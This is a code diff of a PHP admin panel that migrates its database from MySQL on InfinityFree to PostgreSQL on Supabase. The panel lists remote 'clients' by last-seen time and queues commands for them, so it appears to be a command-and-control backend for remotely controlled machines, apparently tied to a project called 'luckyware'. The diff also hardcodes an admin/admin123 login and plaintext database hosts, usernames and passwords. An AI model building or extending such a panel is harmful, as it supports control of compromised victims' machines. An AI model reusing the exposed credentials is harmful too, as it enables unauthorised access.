@@ -7,12 +7,12 @@ session_start();
 $ADMIN_USERNAME = 'admin';
 $ADMIN_PASSWORD = 'admin123';
 
-// Database configuration - MySQL (InfinityFree)
-$db_host = 'sql113.infinityfree.com';
-$db_name = 'if0_43071029_luckyware';  // CHANGE THIS: Replace 'luckyware' with your actual database name
-$db_user = 'if0_43071029';
-$db_pass = '77oUN0U6Fp';
-$db_port = 3306;
+// Database configuration - PostgreSQL (Supabase)
+$db_host = 'db.mljxejdqoxraqimxjhnn.supabase.co';
+$db_name = 'postgres';
+$db_user = 'postgres';
+$db_pass = 'Palette1853141!';
+$db_port = 5432;
 
 // Handle login
 if(isset($_POST['login'])) {
@@ -62,28 +62,29 @@ if(!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
     exit;
 }
 
-// Connect to database
-$conn = @new mysqli($db_host, $db_user, $db_pass, $db_name, $db_port);
-if ($conn->connect_error) {
-    die("Database connection failed: " . $conn->connect_error);
+// Connect to database - PostgreSQL PDO
+try {
+    $conn = new PDO("pgsql:host=$db_host;port=$db_port;dbname=$db_name", $db_user, $db_pass);
+    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+} catch(PDOException $e) {
+    die("Database connection failed: " . $e->getMessage());
 }
-$conn->set_charset("utf8mb4");
 
 // Handle command submission
 if(isset($_POST['send_command'])) {
-    $client_id = mysqli_real_escape_string($conn, $_POST['client_id']);
-    $command_type = mysqli_real_escape_string($conn, $_POST['command_type']);
-    $command_data = isset($_POST['command_data']) ? mysqli_real_escape_string($conn, $_POST['command_data']) : '';
+    $client_id = $_POST['client_id'];
+    $command_type = $_POST['command_type'];
+    $command_data = isset($_POST['command_data']) ? $_POST['command_data'] : '';
     
-    $sql = "INSERT INTO commands (client_id, command_type, command_data, status, created_at) VALUES ('$client_id', '$command_type', '$command_data', 'pending', NOW())";
-    mysqli_query($conn, $sql);
+    $stmt = $conn->prepare("INSERT INTO commands (client_id, command_type, command_data, status, created_at) VALUES (?, ?, ?, 'pending', NOW())");
+    $stmt->execute([$client_id, $command_type, $command_data]);
     
     $success_msg = "Command sent successfully!";
 }
 
 // Get all clients
-$result = mysqli_query($conn, "SELECT * FROM clients ORDER BY last_seen DESC");
-$clients = mysqli_fetch_all($result, MYSQLI_ASSOC);
+$result = $conn->query("SELECT * FROM clients ORDER BY last_seen DESC");
+$clients = $result->fetchAll(PDO::FETCH_ASSOC);
 
 // Auto-refresh every 10 seconds
 ?>
@@ -142,7 +143,7 @@ $clients = mysqli_fetch_all($result, MYSQLI_ASSOC);
         </div>
         <div class="stat-box">
             <h3>Pending Commands</h3>
-            <div class="number"><?= mysqli_fetch_row(mysqli_query($conn, "SELECT COUNT(*) FROM commands WHERE status='pending'"))[0] ?></div>
+            <div class="number"><?= $conn->query("SELECT COUNT(*) FROM commands WHERE status='pending'")->fetchColumn() ?></div>
         </div>
     </div>
     
